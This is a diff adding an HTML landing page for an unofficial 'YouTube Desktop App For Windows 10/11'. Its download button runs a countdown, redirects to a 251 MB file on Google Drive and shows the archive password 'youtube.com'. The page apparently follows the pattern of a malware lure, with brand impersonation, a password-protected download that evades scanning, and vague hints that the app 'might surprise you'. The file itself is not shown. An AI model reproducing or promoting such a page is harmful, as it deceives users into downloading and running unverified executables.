@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>YouTube Desktop App</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      background-color: white;
+      padding: 40px;
+      border-radius: 8px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 500px;
+    }
+    .tips-text, .additional-text, .fun-text {
+      font-size: 20px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+    .extra-text, .info-text {
+      font-size: 16px;
+      color: #666;
+      margin-bottom: 10px;
+    }
+    .download-button {
+      background-color: #ff0000;
+      color: white;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .download-button:hover {
+      background-color: #cc0000;
+    }
+    .password-text {
+      font-size: 16px;
+      color: #333;
+      margin-top: 10px;
+    }
+    #countdown {
+      font-size: 16px;
+      color: #ff0000;
+      margin-top: 10px;
+      transition: opacity 0.5s ease;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="tips-text">
+      <strong>Tips and Facts:</strong><br>
+      You can fullscreen the app by pressing <strong>F11</strong><br>
+      I don't know what will happen when you download a video
+    </div>
+    <div class="additional-text">
+      <strong>Note:</strong><br>
+      This app require internet access for full functionality
+    </div>
+    <div class="fun-text"><strong>Have fun!</strong></div>
+    <div class="extra-text">Keep exploring—this app might surprise you!</div>
+    <div class="info-text">This app is made with Python and you can change the code<br></div>
+    <h1>YouTube Desktop App For Windows 10/11</h1>
+    <button class="download-button" onclick="startCountdown()">Download | 251.38MB</button>
+    <div id="countdown"></div>
+    <div class="password-text">Password: youtube.com</div>
+  </div>
+
+  <script>
+    function startCountdown() {
+      let counter = 3;
+      const countdownDisplay = document.getElementById("countdown");
+      countdownDisplay.textContent = "Starting download in " + counter + "...";
+
+      const interval = setInterval(() => {
+        counter--;
+        if (counter > 0) {
+          countdownDisplay.textContent = "Starting download in " + counter + "...";
+        } else {
+          clearInterval(interval);
+          countdownDisplay.textContent = "Downloading...";
+
+          // Start the download
+          window.location.href = "https://drive.usercontent.google.com/download?id=1-YftZlIE2RoZm1SCZ5iZ1bf2I4nr-cXb&export=download&authuser=0&confirm=t&uuid=467d7dbb-46c1-4782-80d2-f28eb8e619ae&at=AN8xHooV6ecaYgJqScup4rw96iSV%3A1752749084931";
+
+          // Hide "Downloading..." after 5 seconds
+          setTimeout(() => {
+            countdownDisplay.textContent = "";
+          }, 5000);
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
